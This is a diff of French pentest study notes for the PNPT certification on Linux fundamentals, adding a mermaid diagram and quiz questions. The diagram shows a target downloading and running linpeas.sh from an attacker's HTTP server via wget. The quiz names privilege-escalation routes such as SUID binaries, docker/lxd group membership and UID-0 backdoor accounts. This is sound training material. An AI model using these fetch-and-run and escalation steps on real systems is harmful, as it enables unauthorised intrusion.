@@ -4,6 +4,7 @@ domain: "Applied Sciences"
 subdomain: "Computer Science > Security > PNPT"
 tags: [sciences-appliquées, informatique, sécurité, linux, pentest, pnpt]
 date: "2026-05-18"
+prerequis: ["[[Système de Fichiers]]", "[[Bash Basics]]"]
 ---
 
 # Linux Fundamentals
@@ -109,12 +110,13 @@ ss -tulnp                    # ports en écoute + processus (remplace netstat)
 
 Une fois sur la cible, tu dois souvent exfiltrer ou faire monter des outils. Sans interface, on improvise un serveur HTTP :
 
-```
-Attaquant (Kali)                          Cible
-─────────────────                         ──────
-python3 -m http.server 8000      ───►     wget http://10.0.0.1:8000/linpeas.sh
-(sert le répertoire courant)              chmod +x linpeas.sh
-                                          ./linpeas.sh
+```mermaid
+sequenceDiagram
+    participant A as Attaquant (Kali)
+    participant C as Cible
+    Note over A: python3 -m http.server 8000<br/>(sert le répertoire courant)
+    A->>C: wget http://10.0.0.1:8000/linpeas.sh
+    Note over C: chmod +x linpeas.sh<br/>./linpeas.sh
 ```
 
 ```bash
@@ -128,6 +130,26 @@ curl -O http://10.0.0.1:8000/outil
 # Transfert direct SSH (plus discret si SSH est dispo)
 scp fichier user@cible:/tmp/
 ```
+
+## Questions de révision
+
+> [!quiz] Quelle différence de contenu et de droits d'accès entre `/etc/passwd` et `/etc/shadow` ?
+> `/etc/passwd` liste les comptes et est lisible par tous ; `/etc/shadow` contient les hashes des mots de passe et n'est lisible que par root.
+
+> [!quiz] Pourquoi `id` est-il la première commande à lancer après avoir obtenu un shell ?
+> Elle donne l'UID, le GID et surtout les groupes secondaires : appartenir par exemple au groupe `docker` ou `lxd` permet de devenir root immédiatement.
+
+> [!quiz] Que signifie `chmod 755`, et comment se calcule la notation numérique ?
+> `rwxr-xr-x` : tous les droits pour le propriétaire, lecture et exécution pour le groupe et les autres. Chaque chiffre est la somme par classe de `r=4`, `w=2`, `x=1`.
+
+> [!quiz] Qu'est-ce que le bit SUID et pourquoi le rechercher en post-exploitation ?
+> Il fait exécuter un binaire avec les droits de son propriétaire, souvent root ; un binaire SUID root mal configuré permet une élévation de privilèges. On les liste avec `find / -perm -4000 2>/dev/null`.
+
+> [!quiz] Pourquoi un compte d'UID 0 dont le nom n'est pas `root` est-il suspect ?
+> L'UID 0 donne les droits de root quel que soit le nom : c'est une porte dérobée classique.
+
+> [!quiz] Pourquoi `ss -tulnp` est-il utile en pentest ?
+> Il liste les ports en écoute et les processus associés, y compris les services n'écoutant que localement, cibles internes invisibles depuis l'extérieur.
 
 ## Pièges courants
 
